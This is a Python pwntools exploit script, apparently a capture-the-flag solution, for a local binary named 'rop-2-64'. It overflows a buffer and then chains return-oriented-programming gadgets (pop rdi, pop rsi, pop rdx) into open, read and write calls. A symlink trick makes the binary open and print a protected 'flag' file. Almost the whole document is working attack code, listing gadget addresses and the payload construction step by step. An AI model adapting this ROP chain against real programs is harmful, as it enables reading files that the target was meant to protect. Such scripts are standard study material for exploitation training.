#!/usr/bin/env python
from pwn import *
import os

p = process("./rop-2-64")
'''
p = process("./rop-2-xx")
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p)
'''



"""
function addrs
0x00000000004004d0  write@plt
0x00000000004004e0  printf@plt
0x00000000004004f0  read@plt
0x0000000000400500  prctl@plt
0x0000000000400510  open@plt
"""

write_fun = p64(0x00000000004004d0)
read_fun = p64(0x00000000004004f0)
open_fun = p64(0x0000000000400510)


"""
pop ret addrs

0x000000000040073c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040073e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400740 : pop r14 ; pop r15 ; ret
0x0000000000400742 : pop r15 ; ret
0x000000000040057b : pop rbp ; mov edi, 0x601050 ; jmp rax
0x000000000040073b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040073f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x0000000000400743 : pop rdi ; ret
0x0000000000400668 : pop rdx ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
0x000000000040073d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
"""

'''
rdi
rsi
rdx
'''
pop_rdi = p64(0x0000000000400743)
pop_rsi_r15 = p64(0x0000000000400741)
pop_rdx = p64(0x0000000000400668)

buf = "A" * 0x80 + "A" * 8

if os.path.exists("\270"):
        os.unlink("\270")

os.symlink("flag","\270");


#0x4006af <input_func+66>:       "\270"
sym_link_flag = p64(0x4006af)
global_buf = p64(0x601800)

# open("flag", 0, 0)
buf += pop_rdi
buf += sym_link_flag
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += pop_rdx
buf += p64(0)
buf += open_fun

# read(3, global_buf, 16)
buf += pop_rdi
buf += p64(3)
buf += pop_rsi_r15
buf += global_buf
buf += p64(0)
buf += pop_rdx
buf += p64(100)
buf += read_fun

# write(1, global_buf, 16)
buf += pop_rdi
buf += p64(1)
buf += pop_rsi_r15
buf += global_buf
buf += p64(0)
buf += pop_rdx
buf += p64(100)
buf += write_fun

p.sendline(buf)
p.interactive()
